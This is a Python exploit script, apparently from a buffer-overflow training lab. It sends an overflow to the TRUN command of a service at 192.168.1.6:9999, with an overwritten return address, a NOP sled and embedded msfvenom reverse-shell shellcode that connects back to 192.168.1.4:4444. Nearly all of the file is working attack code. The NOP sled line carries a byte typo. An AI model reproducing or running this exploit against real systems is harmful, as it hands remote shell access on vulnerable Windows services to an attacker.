#!/bin/python3

import sys,socket

HOST = '192.168.1.6'
PORT = 9999
#spike = b'A'* 2003
#625011AF
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.4 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
shellcode = b"\xdb\xd9\xd9\x74\x24\xf4\xba\x0f\x7a\xad\xdd\x5d\x31\xc9\xb1"
shellcode += b"\x52\x83\xc5\x04\x31\x55\x13\x03\x5a\x69\x4f\x28\x98\x65\x0d"
shellcode += b"\xd3\x60\x76\x72\x5d\x85\x47\xb2\x39\xce\xf8\x02\x49\x82\xf4"
shellcode += b"\xe9\x1f\x36\x8e\x9c\xb7\x39\x27\x2a\xee\x74\xb8\x07\xd2\x17"
shellcode += b"\x3a\x5a\x07\xf7\x03\x95\x5a\xf6\x44\xc8\x97\xaa\x1d\x86\x0a"
shellcode += b"\x5a\x29\xd2\x96\xd1\x61\xf2\x9e\x06\x31\xf5\x8f\x99\x49\xac"
shellcode += b"\x0f\x18\x9d\xc4\x19\x02\xc2\xe1\xd0\xb9\x30\x9d\xe2\x6b\x09"
shellcode += b"\x5e\x48\x52\xa5\xad\x90\x93\x02\x4e\xe7\xed\x70\xf3\xf0\x2a"
shellcode += b"\x0a\x2f\x74\xa8\xac\xa4\x2e\x14\x4c\x68\xa8\xdf\x42\xc5\xbe"
shellcode += b"\x87\x46\xd8\x13\xbc\x73\x51\x92\x12\xf2\x21\xb1\xb6\x5e\xf1"
shellcode += b"\xd8\xef\x3a\x54\xe4\xef\xe4\x09\x40\x64\x08\x5d\xf9\x27\x45"
shellcode += b"\x92\x30\xd7\x95\xbc\x43\xa4\xa7\x63\xf8\x22\x84\xec\x26\xb5"
shellcode += b"\xeb\xc6\x9f\x29\x12\xe9\xdf\x60\xd1\xbd\x8f\x1a\xf0\xbd\x5b"
shellcode += b"\xda\xfd\x6b\xcb\x8a\x51\xc4\xac\x7a\x12\xb4\x44\x90\x9d\xeb"
shellcode += b"\x75\x9b\x77\x84\x1c\x66\x10\x6b\x48\x69\xe4\x03\x8b\x69\xf5"
shellcode += b"\x8f\x02\x8f\x9f\x3f\x43\x18\x08\xd9\xce\xd2\xa9\x26\xc5\x9f"
shellcode += b"\xea\xad\xea\x60\xa4\x45\x86\x72\x51\xa6\xdd\x28\xf4\xb9\xcb"
shellcode += b"\x44\x9a\x28\x90\x94\xd5\x50\x0f\xc3\xb2\xa7\x46\x81\x2e\x91"
shellcode += b"\xf0\xb7\xb2\x47\x3a\x73\x69\xb4\xc5\x7a\xfc\x80\xe1\x6c\x38"
shellcode += b"\x08\xae\xd8\x94\x5f\x78\xb6\x52\x36\xca\x60\x0d\xe5\x84\xe4"
shellcode += b"\xc8\xc5\x16\x72\xd5\x03\xe1\x9a\x64\xfa\xb4\xa5\x49\x6a\x31"
shellcode += b"\xde\xb7\x0a\xbe\x35\x7c\x2a\x5d\x9f\x89\xc3\xf8\x4a\x30\x8e"
shellcode += b"\xfa\xa1\x77\xb7\x78\x43\x08\x4c\x60\x26\x0d\x08\x26\xdb\x7f"
shellcode += b"\x01\xc3\xdb\x2c\x22\xc6";

BUFFER = b"A" * 2003
EIP = b"\xaf\x11\x50\x62"
NOP = b"x\90" *32
buff = BUFFER + EIP + NOP + shellcode
try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    s.send(b'TRUN /.:/' + buff )
    #sleep(1)
except:
    print("Error connecting to server")
    #print("FUZZING CRASHED AT %s BYTES" % str(len(spike)))
    sys.exit()
